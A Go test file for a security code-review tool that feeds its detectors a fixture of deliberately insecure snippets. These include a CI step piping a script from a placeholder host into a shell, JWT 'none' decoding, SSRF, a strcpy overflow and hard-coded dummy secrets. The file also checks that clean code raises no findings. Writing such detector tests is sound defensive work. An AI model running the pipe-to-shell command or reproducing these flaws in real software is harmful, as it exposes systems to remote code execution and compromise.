package review

import "testing"

// TestGoldenPositives runs a combined fixture exercising many detectors and
// asserts each expected rule fires. Guards against regressions where a
// pattern edit silently disables a detector.
func TestGoldenPositives(t *testing.T) {
	fixture := extraDiff("app.py", "import requests, zipfile, jwt\n"+
		"def f(u):\n"+
		"    requests.get(u)\n"+
		"    zipfile.ZipFile('a.zip').extractall('/tmp')\n"+
		"    return jwt.decode(u, key, algorithms=['none'])\n") +
		extraDiff("main.go", "package main\nimport \"net/http\"\n"+
			"func h(w http.ResponseWriter, r *http.Request) {\n"+
			"\thttp.Get(r.URL.Query().Get(\"u\"))\n"+
			"}\n") +
		extraDiff("app.js", "function f(req) {\n"+
			"  localStorage.setItem('token', req.body.t)\n"+
			"  window.postMessage(req.data, '*')\n"+
			"  return parseInt(req.q)\n"+
			"}\n") +
		extraDiff("Dockerfile", "FROM alpine:latest\nADD https://x.test/a.tgz /a\nUSER root\n") +
		extraDiff("main.tf", "resource \"aws_s3_bucket\" \"b\" {\n  acl = \"public-read\"\n  password = \"Sup3rSecretValue\"\n}\n") +
		extraDiff(".github/workflows/ci.yml", "on: pull_request_target\njobs:\n  x:\n    steps:\n      - run: curl -k https://x.test/i.sh | sh\n") +
		extraDiff(".netrc", "machine example.com login deploy password hunter2abc\n") +
		extraDiff("sec.yaml", "apiVersion: v1\nkind: Secret\ndata:\n  pw: eA==\n") +
		extraDiff("srv.go", "package main\nimport \"net\"\nfunc f() {\n\tnet.Listen(\"tcp\", \":8080\")\n}\n") +
		extraDiff("u.c", "#include <stdio.h>\nvoid f(char *p) {\n    char b[8];\n    strcpy(b, p);\n}\n") +
		extraDiff("w.js", "const ws = new WebSocket(\"ws://x.test/s\")\n")

	want := []string{
		"missing-timeout", "archive-extraction", "jwt-misuse",
		"ssrf", "web-storage-secrets", "postmessage-origin",
		"js-common-mistakes", "dockerfile-remote-add", "dockerfile-user",
		"unpinned-image", "iac-exposure", "terraform-secret",
		"pull-request-target", "pipe-to-shell", "secret-material",
		"k8s-committed-secret", "bind-all-interfaces",
		"unsafe-c-functions", "cleartext-websocket",
	}
	fired := map[string]bool{}
	for _, r := range ExtraRules("/tmp/nonexistent-root") {
		for _, f := range r.Check(fixture) {
			fired[f.Rule] = true
		}
	}
	for _, name := range want {
		if !fired[name] {
			t.Errorf("golden fixture: rule %q did not fire", name)
		}
	}
}

// TestGoldenClean asserts representative clean code produces no findings
// from the extra-rule suite — guards against false-positive regressions.
func TestGoldenClean(t *testing.T) {
	fixture := extraDiff("main.go", "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Println(\"hello\")\n}\n") +
		extraDiff("util.py", "def add(a, b):\n    return a + b\n") +
		extraDiff("app.js", "function add(a, b) {\n  return a + b;\n}\n")
	for _, r := range ExtraRules("/tmp/nonexistent-root") {
		for _, f := range r.Check(fixture) {
			t.Errorf("clean fixture: rule %q fired on %s:%d (%s)", f.Rule, f.File, f.Line, f.Message)
		}
	}
}
